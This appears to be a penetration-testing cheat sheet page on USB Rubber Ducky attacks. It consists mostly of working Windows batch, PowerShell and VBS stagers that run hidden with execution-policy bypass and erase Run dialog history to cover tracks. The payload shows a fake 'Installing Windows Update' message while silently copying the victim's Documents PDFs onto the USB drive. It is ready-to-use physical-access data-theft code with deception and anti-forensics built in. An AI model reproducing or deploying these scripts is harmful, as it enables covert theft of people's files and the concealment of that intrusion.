---
title: Rubber Ducky
category: Exploitation
order: 100
---

> **Find the Rubber Ducky’s drive letter** 

{% highlight powershell %}
for /f %d in ('wmic volume get driveletter^, label^|findstr “DRIVENAME”'') do @set DK=%d 
{% endhighlight %}


> **Execute the Stager** 

{% highlight powershell %}
powershell -NoP -NonI -W Hidden -Exec Bypass " $up = Get-WMIObject Win32Volume | ? { $_.Label -eq 'DriveName' } | select name; cd $uP.name; .\d.cmd"
{% endhighlight %}

> **Clean up run history** 

{% highlight powershell %}
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
{% endhighlight %}

> **Run the Program and Clean-up**

{% highlight powershell %}
powershell -NoP -NonI -W Hidden -Exec Bypass "rp -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $up = Get-WMIObject Win32Volume | ? { $_.Label -eq 'DN' } | select name; cd $uP.name; .\d.cmd"
#Note: Runtime max is 260 characters - use aliases to reduce
#Note: _ is Drive Name
{% endhighlight %}

{% highlight powershell %}
#Second Version
powershell "$u=gwmi Win32_Volume|?($_Label -eq'_')|select name; cd $uname;.\d.cmd"
#65 Character Version
powershell".((gwmi win32_volume -f 'label=''_''').Name+'d.cmd')"
#Note: Runtime max is 260 characters - use aliases to reduce
#Note: _ is Drive Name
#Note: The shorter versions don't change the directory
{% endhighlight %}

> **d.cmd: Stager 1** 

{% highlight powershell %}
@echo off
REM start /MIN e.cmd
@cls
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"
cscript i.vbs e.cmd
@exit
#Note: Powershell portion flashes the CAPS lock button to demonstrate that the first stage has completed successfully
{% endhighlight %}

> **i.vbs: Stager 2** 
{% highlight vb %}
CreateObject("Wscript.Shell").Run """ & WScript.Arguments(0) & """", 0, False
{% endhighlight %}

> **e.cmd: Payload** 

{% highlight powershell %}
@echo off
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Creates directory compromised of computer name, date and time
REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
set dst=%~d0\slurp\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul

if Exist %USERPROFILE%\Documents (
REM /C Continues copying even if errors occur.
REM /Q Does not display file names while copying.
REM /G Allows the copying of encrypted files to destination that does not support encryption.
REM /Y Suppresses prompting to confirm you want to overwrite an existing destination file.
REM /E Copies directories and subdirectories, including empty ones.

REM xcopy /C /Q /G /Y /E %USERPROFILE%\Documents\*.pdf %dst% >>nul

REM Same as above but does not create empty directories
xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.pdf %dst% >>nul
)

REM Blink CAPSLOCK key
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

@cls
@exit
{% endhighlight %}


> **Further References** 

https://www.hak5.org/episodes/season-21/hak5-2112-stealing-files-with-the-usb-rubber-ducky
https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads
https://github.com/hak5darren/USB-Rubber-Ducky/wiki/My-first-payload
https://www.hak5.org/blog/hak5/stealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained
http://www.pentestingshop.com/pentesting/make-your-own-usb-rubber-ducky-using-a-normal-usb-stick/
https://forums.hak5.org/index.php?/topic/34950-how-to-make-a-usb-rubber-ducky-using-a-normal-usb-stick/
